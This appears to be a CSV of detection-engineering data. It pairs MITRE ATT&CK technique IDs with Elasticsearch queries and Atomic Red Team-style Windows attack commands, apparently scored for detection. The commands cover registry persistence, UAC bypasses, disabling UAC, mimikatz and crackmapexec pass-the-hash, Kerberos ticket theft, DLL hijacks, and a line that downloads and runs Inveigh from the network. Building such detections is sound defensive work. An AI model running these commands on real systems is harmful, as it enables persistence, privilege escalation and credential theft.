T1037.001,"{
T1547.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Windows\\CurrentVersion\\Run""}},
                        {""match_phrase"":{""CommandLine"": ""Set-ItemProperty""}}
       ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""hidden""}},
                        {""match"": {""CommandLine"": ""Bypass""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$RunKey = ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run""; 
Set-ItemProperty -Path $RunKey -Name ""socks5_powershell"" -Value ""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File""",2,,
T1547.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""REG_MULTI_SZ""}},
                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Lsa""}},
                {""wildcard"": {""CommandLine"": ""*dll""}},
                {""wildcard"": {""CommandLine"": ""reg*""}},
                 {""match"": {""CommandLine"": ""add""}},
                  {""match"": {""CommandLine"": ""Copy-Item""}}
              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Copy-Item 864d47_package.dll C:\Windows\System32\; 
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\0package.dll"" /f",2,,
T1547.004,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify""}},
                 {""match"": {""CommandLine"": ""logon""}},
                {""wildcard"": {""CommandLine"": ""*dll""}}              ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" -Force; 
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" ""logon"" ""C:\Windows\Temp\atomicNotificationPackage.dll"" -Force",2,,
T1547.004,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Microsoft\\Windows NT\\CurrentVersion\\Winlogon""}},
                  {""match_phrase"": {""CommandLine"": ""Windows\\System32\\cmd.exe""}},
                {""match"": {""CommandLine"": ""Shell""}} ,
                               ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\""
""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force",2,,
T1547.005,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                   {""match_phrase"": {""CommandLine"":""Security Packages""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'; $SecurityPackagesUpdated = $SecurityPackages; $SecurityPackagesUpdated += ""not-a-ssp""; 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated; 
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages",2,,
T1547.009,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*lnk""}},
                {""wildcard"": {""CommandLine"": ""*CreateShortcut""}},
                {""wildcard"": {""CommandLine"": ""*TargetPath""}},
                 {""wildcard"": {""CommandLine"": ""*WorkingDirectory""}},
                 {""wildcard"": {""CommandLine"": ""*Save""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$Shell = New-Object -ComObject (""WScript.Shell"");
$ShortCut = $Shell.CreateShortcut(""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk""); 
$ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\Windows\System32""; $ShortCut.WindowStyle = 1; 
$ShortCut.Description = ""T1547.009.""; $ShortCut.Save(); $Shell = New-Object -ComObject (""WScript.Shell""); $ShortCut = $Shell.CreateShortcut(""$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk"");
 $ShortCut.TargetPath=""cmd.exe""; $ShortCut.WorkingDirectory = ""C:\Windows\System32""; $ShortCut.WindowStyle = 1; 
$ShortCut.Description = ""T1547.009.""; $ShortCut.Save()",0,,
T1547.009,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""echo""}},
                {""match"": {""CommandLine"": ""&gt;""}},
                {""wildcard"": {""CommandLine"":""*.url""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","echo [InternetShortcut] > %temp%\T1547.009_modified_shortcut.url && echo URL=C:\windows\system32\calc.exe 
>> %temp%\T1547.009_modified_shortcut.url && %temp%\T1547.009_modified_shortcut.url",2,,
T1547.010,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                
                 {""wildcard"": {""CommandLine"": ""*dll""}},
                  {""match_phrase"": {""CommandLine"": ""\\currentcontrolset\\control\\print\\monitors\\ART""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg add ""hklm\system\currentcontrolset\control\print\monitors\ART"" /v ""Atomic Red Team"" /d ""C:\Path\AtomicRedTeam.dll"" /t REG_SZ",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""mkdir""}},
                {""match"": {""CommandLine"": ""copy""}},
                {""match"": {""CommandLine"": ""mklink""}},
                {""wildcard"": {""CommandLine"": ""*.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","mkdir ""\\?\C:\Windows \System32\"" && copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" 
&& mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""",2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*.exe""}},
                  {""match_phrase"": {""CommandLine"": ""classes\\mscfile\\shell\\open\\command""}},
                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force; 
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force; 
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
Start-Process ""C:\Windows\System32\ComputerDefaults.exe""",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""classes\\mscfile\\shell\\open\\command""}},
                {""match_phrase"": {""CommandLine"": ""eventvwr.msc""}},
                    {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}}
    ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\software\classes\mscfile\shell\open\command"" -Force;
 Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
Start-Process ""C:\Windows\System32\eventvwr.msc""",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                  {""wildcard"": {""CommandLine"": ""add""}},
                {""match_phrase"": {""CommandLine"": ""eventvwr.msc""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f 
&& cmd.exe /c eventvwr.msc",2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""reg*""}},
                    {""match"": {""CommandLine"": ""add""}},
               {""match_phrase"": {""CommandLine"": ""\\classes\\ms-settings\\shell\\open\\command""}},
                {""match"": {""CommandLine"": ""DelegateExecute""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""C:\Windows\System32\cmd.exe"" /f && reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f && fodhelper.exe",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
               {""match_phrase"": {""CommandLine"":""Classes\\Folder\\shell\\open\\command""}}, 
                  {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force; 
New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force; 
Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe"" -Force; 
Start-Process ""C:\Windows\System32\fodhelper.exe""",,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"":""Classes\\Folder\\shell\\open\\command""}}, 
                {""match_phrase"": {""CommandLine"": ""Start-Process""}},
                {""match_phrase"": {""CommandLine"": ""sdclt.exe""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","New-Item -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Value 'cmd.exe /c notepad.exe';
 New-ItemProperty -Force -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute""; 
Start-Process -FilePath $env:windir\system32\sdclt.exe; Start-Sleep -s 3",2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""reg*""}},
                {""match"": {""CommandLine"": ""ADD""}},
                {""match_phrase"": {""CommandLine"": ""EnableLUA""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f,2,,
T1548.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": "" Akagi64""}},
                {""match_phrase"": {""CommandLine"": "" \\uacme\\23""}}   
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","""%temp%\uacme\23 Akagi64.exe""",2,,
T1550.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""crackmapexec*""}},
                {""match"": {""CommandLine"": ""Administrator""}},
                {""match"": {""CommandLine"": ""whoami""}}
                
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\CrackMapExecWin\crackmapexec.exe %userdnsdomain% -u 
Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami",2,,
T1550.003,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""ticket.kirbi""}},
                 {""match"": {""CommandLine"": ""ptt""}},
                {""match_phrase"": {""CommandLine"": ""Move-Item""}}          ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\PSTools\PsExec.exe -accepteula \\localhost -w c:\ -c $Env:TEMP\rubeus.exe asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi; 
Set-Location $env:TEMP; 
Move-Item -Force ""\\localhost\c$\ticket.kirbi"" ticket.kirbi; 
Write-Host ""Successfully retrieved TGT from 'localhost', now requesting a TGS from local""; 
& ""$Env:TEMP\rubeus.exe"" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt;
 Remove-Item $env:TEMP\ticket.kirbi; & ""$Env:TEMP\rubeus.exe"" purge",2,,
T1556.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                {""match"": {""CommandLine"": ""-Destination""}},
                {""match"": {""CommandLine"": ""-PassThru""}},
                {""wildcard"": {""CommandLine"": ""*basename""}},
                {""match_phrase"": {""CommandLine"": ""Restart-Computer""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$passwordFilterName = (Copy-Item ""PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll"" -Destination ""C:\Windows\System32"" -PassThru).basename; 
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""; 
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages""); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues; Restart-Computer -Confirm",2,,
T1557.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-Inveigh""}},
                {""match"": {""CommandLine"": ""-ConsoleOutput""}},  
                 {""match"": {""CommandLine"": ""-HTTPS""}}           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",2,,
T1574.001,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""copy""}},
              
           
                {""match_phrase"": {""CommandLine"": ""amsi.dll""}}  
          ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe && copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll && %APPDATA%\updater.exe -Command exit,,,
T1574.009,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""copy""}},
                {""match"": {""CommandLine"": ""binpath""}},
                {""match_phrase"": {""CommandLine"": ""\\Program Files\\windows_service.exe""}},
                  {""match_phrase"": {""CommandLine"": ""sc create""}},
                {""match_phrase"": {""CommandLine"": ""sc start""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","copy 0655d1_WindowsServiceExample.exe ""C:\Program Files\windows_service.exe"" && copy 0655d1_WindowsServiceExample.exe ""C:\program.exe"" && sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto && sc start ""Example Service""",2,,
T1574.011,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""reg.exe add""}},
                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\calcservice""}},
                {""match"": {""CommandLine"": ""ImagePath""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\calcservice"" /f /v ImagePath /d ""%windir%\system32\cmd.exe""",2,,
T1574.011,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""get-acl""}},
                 {""match_phrase"": {""CommandLine"": ""\\CurrentControlSet\\Services\\""}},
                  {""match"": {""CommandLine"": ""FL""}},
                        ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL;
 get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL",2,,
T1574.012,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*dll""}}, 
               
                 {""match_phrase"": {""CommandLine"": ""Start-Sleep""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH = '83f016_T1574.012x64.dll'; 
POWERSHELL -c 'Start-Sleep 1'",(?),,
T1574.012,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Write-Host""}},
                {""match_phrase"": {""CommandLine"": ""COR_ENABLE_PROFILING""}},
                 {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\\Session Manager\\Environment""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Write-Host ""Creating system environment variables"" -ForegroundColor Cyan; 
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null; 
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER"" -PropertyType String -Value ""{09108e71-974c-4010-89cb-acf471ae9e2c}"" -Force | Out-Null; 
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null",0,,
T1574.012,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""\\Environment""}},
                {""match_phrase"": {""CommandLine"": ""START""}},
                {""match_phrase"": {""CommandLine"": ""EVENTVWR.MSC""}},
                {""match_phrase"": {""CommandLine"": ""MMC.EXE""}},
                 {""wildcard"": {""CommandLine"": ""*dll""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Write-Host ""Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}"" -ForegroundColor Cyan; 
New-Item -Path ""HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32"" -Value 83f016_T1574.012x64.dll -Force | Out-Null;
New-ItemProperty -Path HKCU:\Environment -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null; 
New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER"" -PropertyType String -Value ""{09108e71-974c-4010-89cb-acf471ae9e2c}"" -Force | Out-Null; 
New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null;
Write-Host ""executing eventvwr.msc"" -ForegroundColor Cyan; 
START MMC.EXE EVENTVWR.MSC",0,,
T1550.002,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""mimikatz ""}},
                {""match"": {""CommandLine"": ""sekurlsa""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","%tmp%\mimikatz\x64\mimikatz.exe 
""sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a""",2,,
T1550.003,"                                  {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""mimikatz*""}},
                 {""match"": {""CommandLine"": ""ptt""}},
                {""match"": {""CommandLine"": ""kerberos""}}
           ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","PathToAtomicsFolder\T1550.003\bin\mimikatz.exe ""kerberos::ptt None""",2,,
